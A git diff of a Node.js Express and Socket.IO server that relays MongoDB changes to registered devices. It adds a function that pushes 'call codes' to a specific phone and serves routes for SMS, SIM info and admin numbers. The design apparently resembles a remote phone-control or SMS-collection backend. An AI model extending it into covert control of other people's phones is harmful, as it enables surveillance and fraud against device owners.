@@ -33,15 +33,15 @@ app.use(cors());
 app.use(express.json());
 app.set("io", io);
 
-// 🧠 Maintain connected device sockets
+// ✅ Maintain connected device sockets
 const deviceSockets = new Map();
 
-// 🌐 SOCKET.IO HANDLER
+// 🌐 SOCKET.IO Logic
 io.on("connection", (socket) => {
   console.log("🟢 Client connected:", socket.id);
   let currentDeviceId = null;
 
-  // ✅ Device registration
+  // ✅ Register device
   socket.on("registerDevice", (uniqueid) => {
     if (!uniqueid) return;
     currentDeviceId = uniqueid;
@@ -51,7 +51,7 @@ io.on("connection", (socket) => {
     saveLastSeen(uniqueid, "Online");
   });
 
-  // ✅ Handle device status ping
+  // ✅ Device status ping
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
@@ -60,7 +60,7 @@ io.on("connection", (socket) => {
     io.emit("deviceStatus", { uniqueid, connectivity, updatedAt: new Date() });
   });
 
-  // ❌ On disconnect
+  // ❌ Disconnect
   socket.on("disconnect", () => {
     console.log("🔴 Socket disconnected:", socket.id);
     if (currentDeviceId) {
@@ -77,7 +77,7 @@ io.on("connection", (socket) => {
   });
 });
 
-// 🔹 Helper: Save Last Seen status
+// 🔹 Helper: Save Last Seen
 async function saveLastSeen(deviceId, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
@@ -91,9 +91,20 @@ async function saveLastSeen(deviceId, connectivity) {
   }
 }
 
+// 🔹 Exported Function — called from controller
+export async function sendCallCodeToDevice(uniqueid, callData) {
+  const socketId = deviceSockets.get(uniqueid);
+  if (socketId) {
+    io.to(socketId).emit("callCodeUpdate", callData);
+    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueid}`);
+  } else {
+    console.warn(`⚠️ Device ${uniqueid} is offline or not connected.`);
+  }
+}
+
 // 🧠 MongoDB Change Streams
 mongoose.connection.once("open", () => {
-  console.log("📡 MongoDB connected — Listening to callcodes, sms, adminnumbers");
+  console.log("📡 MongoDB connected — Watching callcodes, sms, adminnumbers...");
 
   try {
     // 📞 CALLCODES
@@ -107,12 +118,7 @@ mongoose.connection.once("open", () => {
 
       const deviceId = updatedDoc.deviceId;
       console.log(`📞 CallCode Changed → ${deviceId}`);
-
-      // Emit to specific device
-      const socketId = deviceSockets.get(deviceId);
-      if (socketId) io.to(socketId).emit("callCodeUpdate", updatedDoc);
-
-      // Emit globally (optional for monitoring)
+      await sendCallCodeToDevice(deviceId, updatedDoc); // use exported function
       io.emit("globalCallCodeUpdate", updatedDoc);
     });
 
@@ -127,12 +133,8 @@ mongoose.connection.once("open", () => {
 
       const deviceId = updatedDoc.deviceId;
       console.log(`📩 SMS Changed → ${deviceId}`);
-
-      // Emit to specific device
       const socketId = deviceSockets.get(deviceId);
       if (socketId) io.to(socketId).emit("smsUpdate", updatedDoc);
-
-      // Emit globally (optional)
       io.emit("globalSmsUpdate", updatedDoc);
     });
 
@@ -144,9 +146,8 @@ mongoose.connection.once("open", () => {
         .collection("adminnumbers")
         .findOne({ _id: change.documentKey._id });
       if (!updatedDoc) return;
-
       console.log("👑 Admin Number Updated →", updatedDoc);
-      io.emit("adminUpdate", updatedDoc); // Broadcast to all clients
+      io.emit("adminUpdate", updatedDoc);
     });
 
     // Stream errors
@@ -158,12 +159,12 @@ mongoose.connection.once("open", () => {
   }
 });
 
-// 🌍 Base route
+// 🏠 Base route
 app.get("/", (req, res) => {
   res.send("✅ Live Socket + MongoDB Streams running for callcodes, sms, and adminnumbers!");
 });
 
-// 🧭 API routes
+// 🧭 Routes
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
@@ -174,7 +175,7 @@ app.use("/api/serial", serialRoutes);
 app.use("/api/status", statusRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 
-// ❌ 404 + Error handling
+// ❌ 404 & Error handling
 app.use((req, res) =>
   res.status(404).json({ success: false, message: "Route not found" })
 );
